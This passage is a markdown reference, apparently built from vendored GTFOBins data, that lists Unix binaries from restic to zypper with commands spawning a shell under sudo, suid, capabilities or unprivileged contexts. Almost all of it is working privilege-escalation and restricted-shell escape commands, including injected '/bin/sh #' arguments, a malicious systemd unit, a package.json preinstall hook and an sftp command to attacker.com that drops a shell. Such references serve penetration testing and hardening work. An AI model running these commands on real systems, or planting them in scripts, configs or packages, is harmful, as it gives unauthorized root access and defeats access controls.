*Contexts: suid*

```bash
RESTIC_PASSWORD_COMMAND='/bin/sh -p -c "/bin/sh -p 0<&2 1<&2"' restic backup
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
RESTIC_PASSWORD_COMMAND='/bin/sh -c "/bin/sh 0<&2 1<&2"' restic backup
```

shell — suid variant

*Contexts: suid*

```bash
restic --password-command='/bin/sh -p -c "/bin/sh -p 0<&2 1<&2"' backup
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
restic --password-command='/bin/sh -c "/bin/sh 0<&2 1<&2"' backup
```

### rlwrap

shell — suid variant

*Contexts: suid*

```bash
rlwrap /bin/sh -p
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
rlwrap /bin/sh
```

### rpm

*Contexts: sudo, suid, unprivileged*

```bash
rpm --eval '%(/bin/sh 1>&2)'
```

*Contexts: sudo, suid, unprivileged*

```bash
rpm --pipe '/bin/sh 0<&1'
```

### rpmdb

*Contexts: sudo, suid, unprivileged*

```bash
rpmdb --eval '%(/bin/sh 1>&2)'
```

### rpmquery

*Contexts: sudo, suid, unprivileged*

```bash
rpmquery --eval '%(/bin/sh 1>&2)'
```

### rpmverify

*Contexts: sudo, suid, unprivileged*

```bash
rpmverify --eval '%(/bin/sh 1>&2)'
```

### rsync

shell — suid variant

*Contexts: suid*

```bash
rsync -e '/bin/sh -p -c "/bin/sh -p 0<&2 1>&2"' x:x
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
rsync -e '/bin/sh -c "/bin/sh 0<&2 1>&2"' x:x
```

### rtorrent

shell — suid variant

*Contexts: suid*

```bash
echo 'execute = /bin/sh,-p,-c,"/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty"' >~/.rtorrent.rc
rtorrent
```

After the shell, exit with `Ctrl-Q`.

*Contexts: sudo, suid (variant below), unprivileged*

```bash
echo 'execute = /bin/sh,-c,"/bin/sh </dev/tty >/dev/tty 2>/dev/tty"' >~/.rtorrent.rc
rtorrent
```

### ruby

shell — capabilities variant

*Contexts: capabilities*

```bash
ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
```

*Contexts: capabilities (variant below), sudo, unprivileged*

```bash
ruby -e 'exec "/bin/sh"'
```

### run-parts

shell — suid variant

*Contexts: suid*

```bash
run-parts --new-session --regex '^sh$' /bin --arg='-p'
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
run-parts --new-session --regex '^sh$' /bin
```

shell — suid variant

*Contexts: suid*

```bash
cp /bin/sh /path/to/temp-dir/
run-parts /path/to/temp-dir/ --arg='-p'
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
cp /bin/sh /path/to/temp-dir/
run-parts /path/to/temp-dir/
```

### runscript

*Contexts: sudo, suid, unprivileged*

```bash
echo '! exec /bin/sh' >/path/to/temp-file
runscript /path/to/temp-file
```

### rustup

*Contexts: sudo, unprivileged*

```bash
mkdir /path/to/temp-dir/bin/
mkdir /path/to/temp-dir/lib/
cp /bin/sh /path/to/temp-dir/bin/rustc
rustup toolchain link x /path/to/temp-dir/
rustup run x rustc
```

### sash

*Contexts: sudo, suid, unprivileged*

```bash
sash
```

### scanmem

*Contexts: sudo, suid, unprivileged*

```bash
scanmem
shell /bin/sh
```

### scp

*Contexts: sudo, suid, unprivileged*

```bash
echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file
chmod +x /path/to/temp-file
scp -S /path/to/temp-file x x:
```

*Contexts: sudo, suid, unprivileged*

```bash
scp -o 'ProxyCommand=;/bin/sh 0<&2 1>&2' x x:
```

### screen

*Contexts: sudo, unprivileged*

```bash
screen
```

### script

*Contexts: sudo, suid, unprivileged*

```bash
script -q /dev/null
```

### scrot

*Contexts: sudo, suid, unprivileged*

```bash
scrot -e /bin/sh
```

### sed

*Contexts: sudo, suid, unprivileged*

```bash
sed -n '1e exec /bin/sh 1>&0' /etc/hosts
```

*Contexts: sudo, suid, unprivileged*

```bash
sed e
```

### service

*Contexts: sudo, unprivileged*

```bash
service ../../bin/sh
```

### setarch

shell — suid variant

*Contexts: suid*

```bash
setarch -3 /bin/sh -p
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
setarch -3 /bin/sh
```

### setlock

shell — suid variant

*Contexts: suid*

```bash
setlock - /bin/sh -p
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
setlock - /bin/sh
```

### sftp

This still requires a successfull connection to the server.

*Contexts: sudo, suid, unprivileged*

```bash
sftp user@attacker.com
!/bin/sh
```

### sg

shell — sudo variant

*Contexts: sudo*

```bash
sg root
```

Commands can be run if the current user's group is specified, therefore no additional permissions are needed.

*Contexts: sudo (variant below), unprivileged*

```bash
sg $(id -ng)
```

### slsh

*Contexts: sudo, suid, unprivileged*

```bash
slsh -e 'system("/bin/sh")'
```

### smbclient

A valid SMB/CIFS server must be available.

*Contexts: sudo, unprivileged*

```bash
smbclient '\\host\share'
!/bin/sh
```

### socat

shell — suid variant

*Contexts: suid*

```bash
socat - 'exec:/bin/sh -p,pty,ctty,raw,echo=0'
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
socat - exec:/bin/sh,pty,ctty,raw,echo=0
```

### softlimit

shell — suid variant

*Contexts: suid*

```bash
softlimit /bin/sh -p
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
softlimit /bin/sh
```

### split

*Contexts: sudo, suid, unprivileged*

```bash
split --filter='/bin/sh -i 0<&2 1>&2' /etc/hosts
```

### sqlite3

*Contexts: sudo, suid, unprivileged*

```bash
sqlite3 /dev/null '.shell /bin/sh'
```

### ssh

Reconnecting may help bypassing restricted shells.

*Contexts: sudo, suid, unprivileged*

```bash
ssh localhost /bin/sh
```

*Contexts: sudo, unprivileged*

```bash
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```

Spawn the shell on the client, but still requires a successful remote connection.

*Contexts: sudo, unprivileged*

```bash
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
```

### ssh-agent

shell — suid variant

*Contexts: suid*

```bash
ssh-agent /bin/sh -p
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
ssh-agent /bin/sh
```

### sshfs

The mount dir must be writable by the invoking user.

*Contexts: sudo, unprivileged*

```bash
echo -e '/bin/sh </dev/tty >/dev/tty 2>/dev/tty' >/path/to/temp-file
chmod +x /path/to/temp-file
sshfs -o ssh_command=/path/to/temp-file x: /path/to/dir/
```

### sshpass

shell — suid variant

*Contexts: suid*

```bash
sshpass /bin/sh -p
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
sshpass /bin/sh
```

### sshuttle

*Contexts: sudo*

```bash
sudo sshuttle -r x --ssh-cmd '/bin/sh -c "/bin/sh 0<&2 1>&2"' localhost
```

### start-stop-daemon

shell — suid variant

*Contexts: suid*

```bash
start-stop-daemon -S -x /bin/sh -- -p
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
start-stop-daemon -S -x /bin/sh
```

### stdbuf

shell — suid variant

*Contexts: suid*

```bash
stdbuf -i0 /bin/sh -p
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
stdbuf -i0 /bin/sh
```

### strace

shell — suid variant

*Contexts: suid*

```bash
strace -o /dev/null /bin/sh -p
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
strace -o /dev/null /bin/sh
```

### su

*Contexts: sudo*

```bash
su -c /bin/sh
```

### sudo

*Contexts: sudo*

```bash
sudo /bin/sh
```

### systemctl

It might happen that the service is not started with `--now`, in such cases it might be necessary to manually start it.

*Contexts: sudo, suid*

```bash
echo '[Service]
Type=oneshot
ExecStart=/path/to/command
[Install]
WantedBy=multi-user.target' >/path/to/temp-file.service
systemctl link /path/to/temp-file.service
systemctl enable --now /path/to/temp-file.service
```

*Contexts: sudo*

```bash
echo /bin/sh >/path/to/temp-file
chmod +x /path/to/temp-file
SYSTEMD_EDITOR=/path/to/temp-file systemctl edit basic.target
```

### systemd-run

*Contexts: sudo*

```bash
systemd-run -S
```

*Contexts: sudo*

```bash
systemd-run -t /bin/sh
```

### tar

*Contexts: sudo, suid, unprivileged*

```bash
tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

shell — suid variant

*Contexts: suid*

```bash
tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
```

The archive can also be prepared offline then uploaded to the target.

*Contexts: sudo, suid, unprivileged*

```bash
echo '/bin/sh 0<&1' >/path/to/temp-file
tar cf /path/to/temp-file.tar /path/to/temp-file
tar xf /path/to/temp-file.tar --to-command /bin/sh
```

### task

*Contexts: sudo, suid, unprivileged*

```bash
task execute /bin/sh
```

### taskset

*Contexts: sudo, unprivileged*

```bash
taskset 1 /bin/sh
```

### tasksh

*Contexts: sudo, suid, unprivileged*

```bash
tasksh
!/bin/sh
```

### tclsh

*Contexts: sudo, suid, unprivileged*

```bash
tclsh
```

### tcsh

shell — suid variant

*Contexts: suid*

```bash
tcsh -b
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
tcsh
```

### tdbtool

*Contexts: sudo, suid, unprivileged*

```bash
tdbtool
! /bin/sh
```

### telnet

*Contexts: sudo, suid, unprivileged*

```bash
telnet
!/bin/sh
```

### tex

*Contexts: sudo, suid, unprivileged*

```bash
tex --shell-escape '\immediate\write18{/bin/sh}'
```

### time

shell — suid variant

*Contexts: suid*

```bash
time /bin/sh -p
```

Note that the shell might have its own builtin `time` implementation, which may behave differently than the binary, which is often located at `/usr/bin/time`.

*Contexts: sudo, suid (variant below), unprivileged*

```bash
time /bin/sh
```

### timeout

shell — suid variant

*Contexts: suid*

```bash
timeout 0 /bin/sh -p
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
timeout 0 /bin/sh
```

### tmate

*Contexts: sudo, suid, unprivileged*

```bash
tmate -c /bin/sh
```

### tmux

*Contexts: sudo, suid, unprivileged*

```bash
tmux -c /bin/sh
```

Provided to have enough permissions to access the socket (e.g., `/tmp/tmux-xxx/default`).

*Contexts: sudo, suid, unprivileged*

```bash
tmux -S /path/to/socket
```

### top

The config path might be different.

*Contexts: sudo, unprivileged*

```bash
echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
top
# press return twice
reset
```

### torify

*Contexts: sudo, unprivileged*

```bash
torify /bin/sh
```

### torsocks

*Contexts: sudo, unprivileged*

```bash
torsocks /bin/sh
```

### unshare

shell — suid variant

*Contexts: suid*

```bash
unshare -r /bin/sh
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
unshare /bin/sh
```

### uv

*Contexts: sudo, unprivileged*

```bash
uv run /bin/sh
```

### valgrind

*Contexts: sudo, unprivileged*

```bash
valgrind /bin/sh
```

### vi

*Contexts: sudo, suid, unprivileged*

```bash
vi -c ':!/bin/sh' /dev/null
```

*Contexts: sudo, suid, unprivileged*

```bash
vi -c ':shell'
```

shell — suid variant

*Contexts: suid*

```bash
vi -c ':set shell=/bin/sh\ -p | shell'
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
vi -c ':set shell=/bin/sh | shell'
```

shell — suid variant

*Contexts: suid*

```bash
vi -c ':terminal /bin/sh -p'
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
vi -c :terminal /bin/sh
```

### watch

shell — suid variant

*Contexts: suid*

```bash
watch -x /bin/sh -p -c 'reset; exec /bin/sh -p 1>&0 2>&0'
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
watch -x /bin/sh -c 'reset; exec /bin/sh 1>&0 2>&0'
```

*Contexts: sudo, suid, unprivileged*

```bash
watch 'reset; exec /bin/sh 1>&0 2>&0'
```

### wg-quick

Use `wg-quick down /path/to/temp-file.conf` in order to be able to run the shell again.

*Contexts: sudo*

```bash
cat >/path/to/temp-file.conf <<EOF
[Interface]
PostUp = /bin/sh
EOF

wg-quick up /path/to/temp-file.conf
```

### wget

shell — suid variant

*Contexts: suid*

```bash
echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
wget --use-askpass=/path/to/temp-file 0
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
echo -e '#!/bin/sh\n/bin/sh 1>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
wget --use-askpass=/path/to/temp-file 0
```

### xargs

shell — suid variant

*Contexts: suid*

```bash
xargs -a /dev/null /bin/sh -p
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
xargs -a /dev/null /bin/sh
```

shell — suid variant

*Contexts: suid*

```bash
xargs -a /dev/null /bin/sh -p
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
xargs -a /dev/null /bin/sh
```

shell — suid variant

*Contexts: suid*

```bash
echo x | xargs -o -a /dev/null /bin/sh -p
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
echo x | xargs -o -a /dev/null /bin/sh
```

### xdg-user-dir

*Contexts: sudo, unprivileged*

```bash
xdg-user-dir '}; /bin/sh #'
```

### xdotool

shell — suid variant

*Contexts: suid*

```bash
xdotool exec --sync /bin/sh -p
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
xdotool exec --sync /bin/sh
```

### yarn

*Contexts: sudo, unprivileged*

```bash
yarn exec /bin/sh
```

*Contexts: sudo, unprivileged*

```bash
echo '{"scripts": {"preinstall": "/bin/sh"}}' >package.json
yarn --cwd .
```

*Contexts: sudo, unprivileged*

```bash
echo '{"scripts": {"xxx": "/bin/sh"}}' >package.json
yarn --cwd . xxx
```

### yash

*Contexts: sudo, suid, unprivileged*

```bash
yash
```

### yt-dlp

The URL must point to a valid YouTube video which will be actually downloaded.

*Contexts: sudo, unprivileged*

```bash
yt-dlp 'https://www.youtube.com/watch?v=xxxxxxxxxxx' --exec '/bin/sh #'
```

### zathura

The interaction happens in a GUI window, while the shell is dropped in the terminal.

*Contexts: sudo, unprivileged*

```bash
zathura
:! /bin/sh -c 'exec /bin/sh 0<&1'
```

### zip

*Contexts: sudo, suid, unprivileged*

```bash
zip /path/to/temp-file /etc/hosts -T -TT '/bin/sh #'
```

### zsh

*Contexts: sudo, suid, unprivileged*

```bash
zsh
```

### zypper

The copy usually requires elevated privileges.

*Contexts: sudo, unprivileged*

```bash
cp /bin/sh /usr/lib/zypper/commands/zypper-x
zypper x
```

*Contexts: sudo, unprivileged*

```bash
cp /bin/sh /path/to/temp-dir/zypper-x
PATH=$PATH:/path/to/temp-dir/ zypper x
```

## Attribution

Data from [GTFOBins](https://gtfobins.github.io/) (commit `acd524623f9c`), licensed GPL-3.0. Vendored at `vendor/GTFOBins/_gtfobins/`.
